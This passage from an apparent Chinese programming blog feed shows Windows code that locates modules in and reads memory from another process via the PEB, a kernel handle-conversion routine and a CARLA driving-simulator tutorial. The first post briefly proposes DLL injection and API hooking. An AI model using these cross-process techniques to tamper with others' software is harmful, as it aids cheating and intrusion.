获取进程快照的打开句柄，包含模块信息（TH32CS_SNAPMODULE指定） if (!moudleInfoHandle) &#123; CloseHandle(moudleInfoHandle); return NULL; &#125; ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32)); moduleEntry.dwSize = sizeof(MODULEENTRY32); if (!Module32First(moudleInfoHandle, &amp;moduleEntry)) &#123; CloseHandle(moudleInfoHandle); return NULL; &#125; do &#123; if (_tcscmp(moduleEntry.szModule, moduleName) == 0) &#123; CloseHandle(moudleInfoHandle); return moduleEntry.hModule; &#125; &#125; while (Module32Next(moudleInfoHandle, &amp;moduleEntry)); CloseHandle(moudleInfoHandle); return 0;&#125;int main() &#123; HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 进程快照句柄 PROCESSENTRY32 process = &#123; sizeof(PROCESSENTRY32) &#125;; // 存放进程快照的结构体 // 遍历进程 while (Process32Next(hProcessSnap, &amp;process)) &#123; // 找到目标进程 std::string s_szExeFile = process.szExeFile; // char* 转 string if (s_szExeFile == &quot;xxx.exe&quot;) &#123; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process.th32ProcessID); if (hProcess) &#123; HMODULE hMod = GetProcessModuleHandle(process.th32ProcessID, &quot;xxx.dll&quot;); if (hMod) &#123; auto fnAddress = GetProcAddress(hMod, &quot;xxFunc&quot;); std::cout &lt;&lt; fnAddress &lt;&lt;&quot; &quot;&lt;&lt; GetLastError(); &#125; &#125; &#125; &#125;&#125; 2. 枚举进程模块按照微软官方的建议，使用EnumProcessModules函数枚举进程模块可以确定哪些进程加载了特定的DLL。这个函数在psapi.h中。以下是微软给出的实例代码。 123456BOOL EnumProcessModules( [in] HANDLE hProcess, [out] HMODULE *lphModule, [in] DWORD cb, [out] LPDWORD lpcbNeeded); 根据进程ID，调用OpenProcess获取进程句柄。 调用EnumProcessModules函数枚举模块信息。模块句柄都返回到hMods数组中。进一步筛选即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;#include &lt;psapi.h&gt;// 为了确保正确解析符号，需要将 Psapi.lib 添加到 TARGETLIBS，并使用 -DPSAPI_VERSION=1 编译int PrintModules( DWORD processID )&#123; HMODULE hMods[1024]; HANDLE hProcess; DWORD cbNeeded; unsigned int i; // 打印进程标识符。 printf( &quot;\\n进程 ID：%u\\n&quot;, processID ); // 获取进程的句柄。 hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID ); if (NULL == hProcess) return 1; // 获取此进程中所有模块的列表。 if( EnumProcessModules(hProcess, hMods, sizeof(hMods), &amp;cbNeeded)) &#123; for ( i = 0; i &lt; (cbNeeded / sizeof(HMODULE)); i++ ) &#123; TCHAR szModName[MAX_PATH]; // 获取模块文件的完整路径。 if ( GetModuleFileNameEx( hProcess, hMods[i], szModName,sizeof(szModName) / sizeof(TCHAR))) &#123; // 打印模块名和句柄值。 _tprintf( TEXT(&quot;\\t%s (0x%08X)\\n&quot;), szModName, hMods[i] ); &#125; &#125; &#125; // 释放对进程的句柄。 CloseHandle( hProcess ); return 0;&#125;int main( void )&#123; DWORD aProcesses[1024]; DWORD cbNeeded; DWORD cProcesses; unsigned int i; // 获取进程标识符的列表。 if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &amp;cbNeeded ) ) return 1; // 计算返回了多少个进程标识符。 cProcesses = cbNeeded / sizeof(DWORD); // 打印每个进程的模块名称。 for ( i = 0; i &lt; cProcesses; i++ ) &#123; PrintModules( aProcesses[i] ); &#125; return 0;&#125; 3. 获取PEBPEB +0x00c成员Ldr指向_PEB_LDR_DATA结构，此结构的第三成员InMemoryOrderModuleList包含进程的已加载模块的双向链表的头部。列表中的每个项目都是指向LDR_DATA_TABLE_ENTRY结构的指针。 12345678910111213141516typedef struct _LDR_DATA_TABLE_ENTRY &#123; PVOID Reserved1[2]; LIST_ENTRY InMemoryOrderLinks; PVOID Reserved2[2]; PVOID DllBase; PVOID EntryPoint; PVOID Reserved3; UNICODE_STRING FullDllName; BYTE Reserved4[8]; PVOID Reserved5[3]; union &#123; ULONG CheckSum; PVOID Reserved6; &#125;; ULONG TimeDateStamp;&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 因此，这种方法的思路如下： 调用NtWow64QueryInformationProcess64获取PROCESS_BASIC_INFORMATION64(32)结构 调用NtWow64ReadVirtualMemory64（32位用ReadProcessMemory）读出PebBaseAddress 获取到PEB，定位到_PEB_LDR_DATA遍历_LDR_DATA_TABLE_ENTRY 通过FullDllName筛选，DllBase返回模块基地址。 贴一个大佬的获取PEB代码（原谅我实在忘了在哪找到的，知道的朋友请留言一下） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354#include &quot;stdafx.h&quot;#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;subauth.h&gt;#pragma region 依赖 #define NT_SUCCESS(x) ((x) &gt;= 0)#define ProcessBasicInformation 0typedefNTSTATUS(WINAPI *pfnNtWow64QueryInformationProcess64)(HANDLE ProcessHandle, UINT32 ProcessInformationClass, PVOID ProcessInformation, UINT32 ProcessInformationLength, UINT32* ReturnLength); typedefNTSTATUS(WINAPI *pfnNtWow64ReadVirtualMemory64)(HANDLE ProcessHandle, PVOID64 BaseAddress, PVOID BufferData, UINT64 BufferLength, PUINT64 ReturnLength); typedefNTSTATUS(WINAPI *pfnNtQueryInformationProcess)(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, UINT32 ProcessInformationLength, UINT32* ReturnLength); template &lt;typename T&gt;struct _UNICODE_STRING_T&#123; WORD Length; WORD MaximumLength; T Buffer;&#125;; template &lt;typename T&gt;struct _LIST_ENTRY_T&#123; T Flink; T Blink;&#125;; template &lt;typename T, typename NGF, int A&gt;struct _PEB_T&#123; typedef T type; union &#123; struct &#123; BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; &#125;; T dummy01; &#125;; T Mutant; T ImageBaseAddress; T Ldr; T ProcessParameters; T SubSystemData; T ProcessHeap; T FastPebLock; T AtlThunkSListPtr; T IFEOKey; T CrossProcessFlags; T UserSharedInfoPtr; DWORD SystemReserved; DWORD AtlThunkSListPtr32; T ApiSetMap; T TlsExpansionCounter; T TlsBitmap; DWORD TlsBitmapBits[2]; T ReadOnlySharedMemoryBase; T HotpatchInformation; T ReadOnlyStaticServerData; T AnsiCodePageData; T OemCodePageData; T UnicodeCaseTableData; DWORD NumberOfProcessors; union &#123; DWORD NtGlobalFlag; NGF dummy02; &#125;; LARGE_INTEGER CriticalSectionTimeout; T HeapSegmentReserve; T HeapSegmentCommit; T HeapDeCommitTotalFreeThreshold; T HeapDeCommitFreeBlockThreshold; DWORD NumberOfHeaps; DWORD MaximumNumberOfHeaps; T ProcessHeaps; T GdiSharedHandleTable; T ProcessStarterHelper; T GdiDCAttributeList; T LoaderLock; DWORD OSMajorVersion; DWORD OSMinorVersion; WORD OSBuildNumber; WORD OSCSDVersion; DWORD OSPlatformId; DWORD ImageSubsystem; DWORD ImageSubsystemMajorVersion; T ImageSubsystemMinorVersion; T ActiveProcessAffinityMask; T GdiHandleBuffer[A]; T PostProcessInitRoutine; T TlsExpansionBitmap; DWORD TlsExpansionBitmapBits[32]; T SessionId; ULARGE_INTEGER AppCompatFlags; ULARGE_INTEGER AppCompatFlagsUser; T pShimData; T AppCompatInfo; _UNICODE_STRING_T&lt;T&gt; CSDVersion; T ActivationContextData; T ProcessAssemblyStorageMap; T SystemDefaultActivationContextData; T SystemAssemblyStorageMap; T MinimumStackCommit; T FlsCallback; _LIST_ENTRY_T&lt;T&gt; FlsListHead; T FlsBitmap; DWORD FlsBitmapBits[4]; T FlsHighIndex; T WerRegistrationData; T WerShipAssertPtr; T pContextData; T pImageHeaderHash; T TracingFlags; T CsrServerReadOnlySharedMemoryBase;&#125;; typedef _PEB_T&lt;DWORD, DWORD64, 34&gt; _PEB32;typedef _PEB_T&lt;DWORD64, DWORD, 30&gt; _PEB64; typedef struct _STRING_32&#123; WORD Length; WORD MaximumLength; UINT32 Buffer;&#125; STRING32, *PSTRING32; typedef struct _STRING_64&#123; WORD Length; WORD MaximumLength; UINT64 Buffer;&#125; STRING64, *PSTRING64; typedef struct _RTL_DRIVE_LETTER_CURDIR_32&#123; WORD Flags; WORD Length; ULONG TimeStamp; STRING32 DosPath;&#125; RTL_DRIVE_LETTER_CURDIR32, *PRTL_DRIVE_LETTER_CURDIR32; typedef struct _RTL_DRIVE_LETTER_CURDIR_64&#123; WORD Flags; WORD Length; ULONG TimeStamp; STRING64 DosPath;&#125; RTL_DRIVE_LETTER_CURDIR64, *PRTL_DRIVE_LETTER_CURDIR64; typedef struct _UNICODE_STRING_32&#123; WORD Length; WORD MaximumLength; UINT32 Buffer;&#125; UNICODE_STRING32, *PUNICODE_STRING32; typedef struct _UNICODE_STRING_64&#123; WORD Length; WORD MaximumLength; UINT64 Buffer;&#125; UNICODE_STRING64, *PUNICODE_STRING64; typedef struct _CURDIR_32&#123; UNICODE_STRING32 DosPath; UINT32 Handle;&#125; CURDIR32, *PCURDIR32; typedef struct _RTL_USER_PROCESS_PARAMETERS_32&#123; ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; UINT32 ConsoleHandle; ULONG ConsoleFlags; UINT32 StandardInput; UINT32 StandardOutput; UINT32 StandardError; CURDIR32 CurrentDirectory; UNICODE_STRING32 DllPath; UNICODE_STRING32 ImagePathName; UNICODE_STRING32 CommandLine; UINT32 Environment; ULONG StartingX; ULONG StartingY; ULONG CountX; ULONG CountY; ULONG CountCharsX; ULONG CountCharsY; ULONG FillAttribute; ULONG WindowFlags; ULONG ShowWindowFlags; UNICODE_STRING32 WindowTitle; UNICODE_STRING32 DesktopInfo; UNICODE_STRING32 ShellInfo; UNICODE_STRING32 RuntimeData; RTL_DRIVE_LETTER_CURDIR32 CurrentDirectores[32]; ULONG EnvironmentSize;&#125; RTL_USER_PROCESS_PARAMETERS32, *PRTL_USER_PROCESS_PARAMETERS32; typedef struct _CURDIR_64&#123; UNICODE_STRING64 DosPath; UINT64 Handle;&#125; CURDIR64, *PCURDIR64; typedef struct _RTL_USER_PROCESS_PARAMETERS_64&#123; ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; UINT64 ConsoleHandle; ULONG ConsoleFlags; UINT64 StandardInput; UINT64 StandardOutput; UINT64 StandardError; CURDIR64 CurrentDirectory; UNICODE_STRING64 DllPath; UNICODE_STRING64 ImagePathName; UNICODE_STRING64 CommandLine; UINT64 Environment; ULONG StartingX; ULONG StartingY; ULONG CountX; ULONG CountY; ULONG CountCharsX; ULONG CountCharsY; ULONG FillAttribute; ULONG WindowFlags; ULONG ShowWindowFlags; UNICODE_STRING64 WindowTitle; UNICODE_STRING64 DesktopInfo; UNICODE_STRING64 ShellInfo; UNICODE_STRING64 RuntimeData; RTL_DRIVE_LETTER_CURDIR64 CurrentDirectores[32]; ULONG EnvironmentSize;&#125; RTL_USER_PROCESS_PARAMETERS64, *PRTL_USER_PROCESS_PARAMETERS64; typedef struct _PROCESS_BASIC_INFORMATION64 &#123; NTSTATUS ExitStatus; UINT32 Reserved0; UINT64 PebBaseAddress; UINT64 AffinityMask; UINT32 BasePriority; UINT32 Reserved1; UINT64 UniqueProcessId; UINT64 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION64; typedef struct _PROCESS_BASIC_INFORMATION32 &#123; NTSTATUS ExitStatus; UINT32 PebBaseAddress; UINT32 AffinityMask; UINT32 BasePriority; UINT32 UniqueProcessId; UINT32 InheritedFromUniqueProcessId;&#125; PROCESS_BASIC_INFORMATION32;#pragma endregionint _tmain(int argc, _TCHAR* argv[])&#123; HANDLE m_ProcessHandle = OpenProcess( PROCESS_ALL_ACCESS, // 所有权限 FALSE, // 不继承句柄 8016 // 进程ID，此处为了方便直接写死 ); BOOL bSource = FALSE; // 判断自身进程是否为 64位 BOOL bTarget = FALSE; // 判断目标进程是否为 64位 IsWow64Process( GetCurrentProcess(), // 进程句柄 &amp;bSource // 用来接收返回值的变量，64位 FLASE | 32位 TRUE ); IsWow64Process( m_ProcessHandle, // 进程句柄 &amp;bTarget // 用来接收返回值的变量，64位 FLASE | 32位 TRUE ); // 目标 64位，自身 32位 if(bTarget == FALSE &amp;&amp; bSource == TRUE) &#123; // 获取 ntdll.dll 模块句柄 HMODULE NtdllModule = GetModuleHandle(&quot;ntdll.dll&quot;); pfnNtWow64QueryInformationProcess64 NtWow64QueryInformationProcess64 = (pfnNtWow64QueryInformationProcess64)GetProcAddress(NtdllModule,&quot;NtWow64QueryInformationProcess64&quot;); pfnNtWow64ReadVirtualMemory64 NtWow64ReadVirtualMemory64 = (pfnNtWow64ReadVirtualMemory64)GetProcAddress(NtdllModule,&quot;NtWow64ReadVirtualMemory64&quot;); PROCESS_BASIC_INFORMATION64 pbi = &#123;0&#125;; UINT64 ReturnLength = 0; NTSTATUS Status = NtWow64QueryInformationProcess64(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)sizeof(pbi),(UINT32*)&amp;ReturnLength); if (NT_SUCCESS(Status))&#123; _PEB64* Peb = (_PEB64*)malloc(sizeof(_PEB64)); RTL_USER_PROCESS_PARAMETERS64* ProcessParameters = (RTL_USER_PROCESS_PARAMETERS64*)malloc(sizeof(RTL_USER_PROCESS_PARAMETERS64)); Status = NtWow64ReadVirtualMemory64(m_ProcessHandle,(PVOID64)pbi.PebBaseAddress,(_PEB64*)Peb,sizeof(_PEB64),&amp;ReturnLength); std::cout &lt;&lt; &quot;PEB地址:&quot; &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl; //cout &lt;&lt; &quot;Ldr:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;Ldr &lt;&lt; endl; //cout &lt;&lt; &quot;ImageBaseAddress:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;ImageBaseAddress &lt;&lt; endl; &#125; &#125; // 目标 32位，自身 32位 else if (bTarget == TRUE &amp;&amp; bSource == TRUE) &#123; HMODULE NtdllModule = GetModuleHandle(&quot;ntdll.dll&quot;); pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(NtdllModule,&quot;NtQueryInformationProcess&quot;); PROCESS_BASIC_INFORMATION32 pbi = &#123;0&#125;; UINT32 ReturnLength = 0; NTSTATUS Status = NtQueryInformationProcess(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)sizeof(pbi),(UINT32*)&amp;ReturnLength); if (NT_SUCCESS(Status))&#123; _PEB32* Peb = (_PEB32*)malloc(sizeof(_PEB32)); ReadProcessMemory(m_ProcessHandle, (PVOID)pbi.PebBaseAddress,(_PEB32*)Peb,sizeof(_PEB32),NULL); std::cout &lt;&lt; &quot;PEB地址:&quot; &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl; //printf(&quot;LdrAddress:%x\\r\\n&quot;, ((_PEB32*)Peb)-&gt;Ldr); //printf(&quot;ImageBaseAddress:%x\\r\\n&quot;, ((_PEB32*)Peb)-&gt;ImageBaseAddress); &#125; &#125; getchar(); return 0;&#125; 4. 注入对目标进程进行DLL注入，Hook GetMoudleHandle、Loadlibary等函数，让目标进程自己调用，进行IPC通信。 参考PEB （winternl.h） - Win32 应用 |Microsoft 学习 PEB_LDR_DATA （winternl.h） - Win32 应用 |Microsoft 学习 PEB及LDR链 - bokernb - 博客园 (cnblogs.com) 远程获取进程DLL模块地址_获取进程模块-CSDN博客 CreateToolhelp32Snapshot 函数 (tlhelp32.h) - Win32 apps | Microsoft Learn 枚举进程的所有模块 - Win32 apps | Microsoft Learn","categories":[{"name":"Windows Programming","slug":"Windows-Programming","permalink":"https://qianmuoy.github.io/categories/Windows-Programming/"}],"tags":[]},{"title":"目标进程用户模式句柄转换为内核句柄","slug":"目标进程用户模式句柄转换为内核句柄","date":"2024-02-04T12:45:37.000Z","updated":"2024-02-04T12:46:24.960Z","comments":true,"path":"2024/02/04/目标进程用户模式句柄转换为内核句柄/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E5%8F%A5%E6%9F%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%86%85%E6%A0%B8%E5%8F%A5%E6%9F%84/","excerpt":"","text":"目标进程用户模式句柄转换为内核句柄网上很多方法都是Ring0内核进程和句柄互相转换的方法，查了一下没怎么看到说怎么将用户模式句柄转换为内核句柄的。如果内核获取到的是目标进程的句柄，拷贝到内核模式是不能直接使用的，会引发异常。 目前想到的实现思路是： 如果是伪句柄，直接返回后面再来处理。 调用ObReferenceObjectByHandle指定用户模式句柄获取任意对象的体指针 （EProcess、EThread ） 调用ObOpenObjectByPointer打开指针所引用的对象，并返回对象的句柄，此时设置为内核句柄。就获取到啦。 本人是菜鸟，各位师傅如果知道其他的方法跪求指点！！！ 实现代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758NTSTATUS ConvertKernelHandle( IN HANDLE UserHandle, OUT PHANDLE KernelHandle, POBJECT_TYPE ObjectType)&#123; NTSTATUS Status = STATUS_SUCCESS; PVOID Object = NULL; //任意对象的体指针 EProcess EThread LONG v1 = (LONG)UserHandle; if (KernelHandle == NULL) &#123; Status = STATUS_INVALID_PARAMETER; goto Exit; &#125; if (v1 &lt;= 0) &#123; *KernelHandle = UserHandle; Status = STATUS_SUCCESS; goto Exit; &#125; Status = ObReferenceObjectByHandle( UserHandle, 0, ObjectType, UserMode, &amp;Object, NULL ); if (Status != STATUS_SUCCESS) &#123; goto Exit; &#125; Status = ObOpenObjectByPointer( Object, OBJ_KERNEL_HANDLE, 0, 0, NULL, KernelMode, KernelHandle ); if (*KernelHandle == UserHandle) &#123; Status = STATUS_UNSUCCESSFUL; &#125;Exit: if (Object != NULL) &#123; ObDereferenceObject(Object); &#125; return Status;&#125; 伪句柄转换为真实句柄，可以调用复制对象句柄的DuplicateHandle。 123456789BOOL DuplicateHandle( [in] HANDLE hSourceProcessHandle, [in] HANDLE hSourceHandle, [in] HANDLE hTargetProcessHandle, [out] LPHANDLE lpTargetHandle, [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwOptions); 微软官方在对此函数的解释中，说明了如果 hSourceHandle 是伪句柄， 会将其转换为进程或线程的实际句柄。 参考ObOpenObjectByPointer 函数 (ntifs.h) - Windows drivers | Microsoft Learn ObReferenceObjectByHandle 函数 (wdm.h) - Windows drivers | Microsoft Learn DuplicateHandle 函数 (handleapi.h) - Win32 apps | Microsoft Learn 伪句柄转换为真正的句柄 - 沉疴 - 博客园 (cnblogs.com)","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"基于CALRA和DQN实现自动驾驶的仿真","slug":"基于CALRA和DQN实现自动驾驶的仿真","date":"2024-02-04T12:43:53.000Z","updated":"2024-02-04T12:44:04.632Z","comments":true,"path":"2024/02/04/基于CALRA和DQN实现自动驾驶的仿真/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E5%9F%BA%E4%BA%8ECALRA%E5%92%8CDQN%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E7%9A%84%E4%BB%BF%E7%9C%9F/","excerpt":"","text":"基于carla与DQN实现自动驾驶的仿真 1. 安装1.1 配置虚拟环境在anaconda prompt逐条运行下面命令，单独配置虚拟环境。car是名字，可以自己取，但是python必须是3.7。创建好后使用pip命令下载配置所有的库（方便换源，conda换源不太方便）。 123conda create -n car python=3.7conda activate carpip install carla,pygame,numpy 1.2 配置carla模拟器CARLA Simulator 点击进入官网，可以查看版本信息与官方文档。官方文档是我们学习的基础。下载模拟器时，应该进入官网查看最新版本，再前往carla的github主页进行下载，确保下载的是最新版本。因为只有最新版本的carla能通过pip命令安装依赖库，其他版本的安装非常繁琐（在下面第三大点有详细描述）。版本错误程序会直接崩溃。Releases · carla-simulator&#x2F;carla (github.com) 根据版本下载对应的压缩包或使用git命令克隆下来。注意carla只支持Linux的乌班图系统和windows系统，不支持mac系统，mac用户使用虚拟机下载。 1.3 仿真环境初体验解压下载好的压缩包，运行CarlaUE4.exe。windows可能会报“发布者未知”，这里点击信任，或直接关闭防火墙。carla的内核是虚幻4，需要较高的配置支持，首次启动请等待片刻。进去后是这样的画面： carla有好几个地图，还可以下载地图拓展，这里是默认的一号地图，后面可以在代码中修改。使用wasd键控制前后左右，按住鼠标中键可以转换视角，细看城市中的内容。后面可以在代码中修改地图。 使用conda命令窗口，激活car环境，使用cd命令转到WindowsNoEditor\\PythonAPI\\examples，使用python manual_control.py命令运行这个代码，可以得到一辆车，自由操控，使用Back键还能换别的来玩。 即使是这样，城市也非常空旷。接下来我们来看看如何使用carla进行自动驾驶的仿真。 2. CARLA Simulator的核心概念2.1 客户端2.1.1客户端客户端是 CARLA 架构中的主要元素之一。 它们连接到服务器、检索信息和命令更改。 这是通过脚本完成的。 客户端识别自己，并连接到世界，然后使用模拟进行操作。 除此之外，客户还可以访问高级 CARLA 模块、功能和应用命令批处理。 本节仅介绍命令批处理。 这些对于生成大量actors之类的基本事物很有用。 其余功能更为复杂，将在各自页面的高级步骤中进行介绍。 查看 Python API 参考中的 carla.Client 以了解该类的特定方法和变量。 2.1.2 客户端的创建使用carla.Client方法创建。需要三个参数，标识它的 IP 地址，以及用于与服务器通信的两个 TCP 端口。可选的第三个参数设置工作线程的数量。 默认情况下，这设置为全部 (0)。默认情况下，CARLA 使用本地主机 IP 和端口 2000 进行连接，但这些可以随意更改。 在这种情况下，第二个端口将始终为 n+1, 2001。 1client = carla.Client(&#x27;localhost&#x27;, 2000) 2.1.3 设置客户端超时时间创建客户端后，使用set_timeout方法设置其超时时间。 这限制了所有网络操作，因此这些操作不会永远阻塞客户端。 如果连接失败，将返回错误。 可以连接多个客户端，因为一次运行多个脚本是很常见的。 超时时间以秒为单位。 1client.set_timeout(10.0) 2.1.4 检查版本客户端和服务器具有不同的 libcarla 模块。 如果版本不同，可能会出现问题。 这可以使用 get_client_version() 和 get_server_version() 方法进行检查。 12print(client.get_client_version())print(client.get_server_version()) 2.1.5虚拟世界连接客户端可以相当轻松地连接和检索当前世界。 1world = client.get_world() 客户端还可以获取可用地图列表来更改当前地图。 这将摧毁当前的世界并创造一个新的世界。 1234print(client.get_available_maps())...world = client.load_world(&#x27;Town01&#x27;)# client.reload_world() creates a new instance of the world with the same map. 每个世界对象都有一个 ID 或形象地称作“情节”。 每次客户端调用 load_world() 或 reload_world() 时，前一个都会被销毁。 新的“情节”是从头开始创建的。 在此过程中不会重新启动虚幻引擎。 2.1.6 运行命令命令是对一些最常见的 CARLA 方法的改编，可以批量应用。 例如，command.SetAutopilot 等价于 Vehicle.set_autopilot()，为车辆启用自动驾驶仪。 但是，使用 Client.apply_batch() 或 Client.apply_batch_sync() 方法，可以在一个模拟步骤中应用一系列命令。 这对于通常应用于甚至数百个元素的方法变得非常有用。 以下示例使用批处理一次性销毁车辆列表。 1client.apply_batch([carla.command.DestroyActor(x) for x in vehicles_list]) 因此我们后面创建actors时，会开一个列表来存放方便销毁。 2.1.7 其他客户端实用程序客户端对象的主要目的是获取或改变世界，并应用命令。 但是，它还提供对一些附加功能的访问。 交通管理模块：该模块负责每辆设置为自动驾驶的车辆，以重建城市交通。 录像模块：允许重新制定以前的模拟。 通过录像快照来总结每帧的模拟状态。 后面会重新提及。 2.2 虚拟世界2.2.1 虚拟世界模拟测试的主要部分。 它的实例应该由客户端检索。 它不包含世界本身的模型，它是 Map 类的一部分。 相反，可以从此类访问大部分信息和常规设置。 模拟中的参与者和旁观者 蓝图库 地图 模拟设置 快照 天气和灯光管理器 它的一些最重要的方法是 getter，精确地检索这些元素的信息或实例。 查看 carla.World 以了解更多信息。、 carla.World PythonAPI reference： Instance Variables id (int)：与这个世界关联的 episode 的 id debug (carla.DebugHelper)：负责创建不同的 shapes for debugging Methods apply_settings：将 carla.WorldSettings 对象包含的设置应用于仿真，并返回实现他们的帧 id cast_ray：将射线从指定的 initial_location 投射到 final_location，检测与射线相交的所有几何体，并按顺序返回到 carla.LabelledPoint 列表 enable_environment_objects：启用或禁用由 id 标识的一组 EnvironmentObject。这些对象将在关卡中显示或消失 freeze_all_traffic_lights：冻结或解冻场景中所有的交通信号灯 ground_projection：将指定的点向下 (0,0,-1) 投射到场景中，并返回 carla.Labelled 对象，这个对象是与射线相交的第一个几何体（通常是地面） load_map_layer：将选定的图层加载到关卡 on_tick：此方法用于异步模式，从客户端启用传入的回调 callback project_point：将指定的点投影到场景中的所需方向 remove_on_tick：停止从 on_tick 开始的 callback_id 的回调 reset_all_traffic_lights：将地图中所有交通信号灯的周期重置为初始状态 spawn_actor：在世界中创建 Actor tick：此方法用于同步模式，发从 tick 给 server，返回服务器计算好的新 id try_spawn_actor：与 spawn_actor，但失败使返回 None 而不是异常 unload_map_layer：将选定的图层卸载 wait_for_tick：此方法用于异步模式，使客户端等服务器 tick Getters get_actor：通过 id 查找 Actor，如果没找到返回 None get_actors：检索 carla.Actor 列表，使用提供的 id 列表返回所有的 Actor get_blueprint_library：返回可以在世界中创建的 Actor 列表 get_environment_objects：返回带有请求的语义的 EnvironmentObject 列表 get_level_bbs：返回在世界空间中具有位置和渲染的边界框数组 get_lightmanager：返回 carla.LightManager 的实例，该实例可用于处理场景中的灯光 get_map：像服务器查询包含地图文件的 XDOR，将其解析为 carla.Map 并返回 get_random_location_form_navigation：只能和行人一起使用。检索被用作目的地的随机位置 go_to_location 的 carla.WalkerAIController get_settings：返回一个包含仿真数据的对象，例如客户端和服务器之间同步或渲染模式 get_snapshot：返回某个时刻的世界快照，包括有关参与者的所有信息 get_spectator：返回观察者。观察者用来作为相机，并控制仿真窗口中的视图 get_traffic_light：提供一个 landmark，返回他描述的交通灯对象 get_traffic_sign：提供一个 landmark，返回他描述的交通标志对象 get_vehicles_light_states：返回一个字典，他的 key 是 carla.Actor id，value 是 carla.VehicleLightState get_weather：检索一个对象，该对象包含当前仿真的天气参数，主要是 云、雨、风和太阳的位置 Setters set_weather：设定天气 Dunder methods __str__：解析并打印世界内容，作为其当前状态的简要报告 2.2.2 元素世界有不同的方法，这与允许不同功能的“参与者”相关。 生成actors（但不破坏它们） 让每个元素都在现场，或者特别找一个 访问蓝图库 访问旁观者视角 检索适合生成元素的随机位置。 actors就是“演员”，代表着世界里可以移动的物体，包括汽车，传感器（因为传感器要安在车身上）以及行人。 2.2.3 天气天气本身不是一个类，而是一组可从世界访问的参数。 参数化包括太阳方向、云量、风、雾等等。 辅助类 carla.WeatherParameters 用于定义自定义天气。 12345678weather = carla.WeatherParameters( cloudiness=80.0, precipitation=30.0, sun_altitude_angle=70.0)world.set_weather(weather)print(world.get_weather()) 有一些天气预设可以直接应用于世界。 这些在 carla.WeatherParameters 中列出，并可作为枚举访问。 1world.set_weather(carla.WeatherParameters.WetCloudySunset) 天气也可以使用 CARLA 提供的两个脚本进行自定义。 environment.py (in PythonAPI/util) — 提供对天气和灯光参数的访问，以便实时更改这些参数。 environment.py中的可选参数： 123456789101112131415-h, --help show this help message and exit--host H IP of the host server (default: 127.0.0.1)-p P, --port P TCP port to listen to (default: 2000)--sun SUN Sun position presets [sunset | day | night]--weather WEATHER Weather condition presets [clear | overcast | rain]--altitude A, -alt A Sun altitude [-90.0, 90.0]--azimuth A, -azm A Sun azimuth [0.0, 360.0]--clouds C, -c C Clouds amount [0.0, 100.0]--rain R, -r R Rain amount [0.0, 100.0]--puddles Pd, -pd Pd Puddles amount [0.0, 100.0]--wind W, -w W Wind intensity [0.0, 100.0]--fog F, -f F Fog intensity [0.0, 100.0]--fogdist Fd, -fd Fd Fog Distance [0.0, inf)--wetness Wet, -wet Wet Wetness intensity [0.0, 100.0] dynamic_weather.py (in PythonAPI/examples) — 启用开发人员为每个 CARLA 地图准备的特定天气周期。 dynamic_weather.py的可选参数： 12345-h, --help show this help message and exit--host H IP of the host server (default: 127.0.0.1)-p P, --port P TCP port to listen to (default: 2000)-s FACTOR, --speed FACTOR rate at which the weather changes (default: 1.0) 天气的变化不会影响世界中的车辆的物理性质。 它们只是相机传感器可以捕捉到的视觉效果。当 sun_altitude_angle &lt; 0 时，夜间模式开始，这被认为是日落。 这是灯光变得特别重要的时候。世界中路灯会自动打开。 2.2.4 光线路灯有这些相关类： carla.Light：地图开发者放置的 lights，通过 carla.Light 对象访问 carla.LightState：颜色和强度等属性，在 light_state 中设置 carla.LightGroup：使用 light_group 进行分类，例如 路灯、建筑物灯… carla.LightManager：可以在一个调用中被检索来处理一组灯光 当模拟进入夜间模式时，路灯会自动打开。 灯光由地图的开发人员放置，并可作为 carla.Light 对象访问。 颜色和强度等属性可以随意更改。 carla.LightState 类型的变量 